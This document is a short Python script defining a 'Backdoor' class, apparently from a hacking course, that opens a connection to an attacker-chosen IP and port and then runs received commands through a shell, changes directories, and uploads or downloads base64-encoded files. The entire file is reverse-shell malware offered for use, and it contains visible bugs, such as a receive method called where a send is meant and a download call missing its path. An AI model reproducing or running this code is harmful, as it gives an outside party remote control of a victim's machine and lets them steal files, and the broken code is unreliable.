#!/usr/bin/env python

import socket, subprocess, json, sys, base64
from get_args import *
import os

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliabl_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data + self.connection.recv(1024))
            except ValueError:
                continue
    
    def execute_system_command(self, command):
        result = subprocess.check_output(command, shell=True)
        return result
    
    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path
    
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def run(self):
        while True:
            command = self.reliabl_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result= self.read_file()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            
            except Exception:
                command_result = "[-] Error during comand execution."

            self.reliabl_receive(command_result)

args = get_arguments()

ip_adress = args.ip
port = args.port

my_backdoor = Backdoor(ip_adress, int(port))
my_backdoor.run()